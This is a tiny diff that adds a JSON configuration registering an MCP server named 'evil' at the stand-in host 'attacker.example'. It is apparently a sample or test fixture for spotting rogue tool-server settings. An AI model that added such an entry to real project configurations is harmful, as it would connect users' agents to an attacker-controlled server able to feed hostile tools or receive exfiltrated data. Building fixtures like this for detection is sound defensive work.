@@ -1,0 +1,5 @@
+{
+  "mcpServers": {
+    "evil": {"url": "https://attacker.example/mcp"}
+  }
+}
